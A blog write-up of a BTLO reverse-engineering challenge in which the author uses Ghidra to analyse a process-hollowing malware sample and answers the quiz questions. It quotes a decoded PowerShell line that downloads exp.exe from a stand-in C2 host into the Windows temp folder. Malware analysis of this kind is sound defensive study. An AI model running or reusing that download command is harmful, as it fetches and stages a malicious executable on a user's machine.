---
author: pl4int3xt
layout: post
title: Injection series part 4
date: '2023-10-04 15:09:52 +0800'
cover: img/cover_images/27.png
description: "Reverse engineer the given file and understand the behavior. You can use any disassembler you like to complete this challenge."
categories: [BTLO, Reverse Engineering]
tags: [Reverse Engineering, BTLO, Malware]
---

## Injection Series Part 4
Reverse engineer the given file and understand the behavior. You can use any disassembler you like to complete this challenge. 


## Question 1 : What is the process that would be first spawned by the sample? And what is the API used?

I'll be using my favourite reverse engineering tool Ghidra you can use any other tool of your choice.

![img-description](/assets/img/injection-part4/ghidra1.png)

We see the entry function and now we move to the next function

![img-description](/assets/img/injection-part4/ghidra2.png)

We locate the main function by the return value. Since the main function must return something that's how we locate the code that was written by the developer.

![img-description](/assets/img/injection-part4/ghidra3.png)

We are now able to locate the API used and the process first spawned

## Question 2 : The value 4 has been pushed as a parameter to this API, what does that denote? (Format: FLAG)

![img-description](/assets/img/injection-part4/ghidra4.png)

we can see the value 4 passed in CreateFileA Api call so we will do some google search on that function

![img-description](/assets/img/injection-part4/proc.png)

we get the parameter being passed and search it's function

![img-description](/assets/img/injection-part4/getproc.png)

## Question 3: What is the domain that the malware tries to connect? (Format: domain.tld)

We notice a powershell script executed in the code

![img-description](/assets/img/injection-part4/ghidra5.png)

so we try to decode

![img-description](/assets/img/injection-part4/cyberchef.png)

``` bash
Invoke-WebRequest -Uri http://somec2.server/exp.exe -OutFile c:\\windows\\temp\\exp.exe
```
we see the domain from the code

## Question 4: What is the cmdlet used to download the file and what is the path of the file stored? (Format: CMDLET, path) 

We already have all the details from the code in question 3

## Question 5: Just after the file download instructions, a function from ntdll has been loaded and invoked by the sample. What is the function name? (Format: Function)

We can see the function invoked in the code below

![img-description](/assets/img/injection-part4/ghidra6.png)

## Question 6: After the allocation of memory and writing the date into the allocated memory. What are the 2 APIs used to update the entry point and resume the thread? (Format: API, API)

We can see the two APIs being used for threading

![img-description](/assets/img/injection-part4/ghidra7.png)

## Question 7: What is the MITRE ID for this technique implemented in this sample? (Format: TXXXX.XXX)

The malware first executes a process in suspended mode and then allocates some memory and write data into it. After that it resumes the process thread, which allows it to do malicious activities without being detected by antivirus programs. This is called process injection or hallowing

![img-description](/assets/img/injection-part4/mitre.png)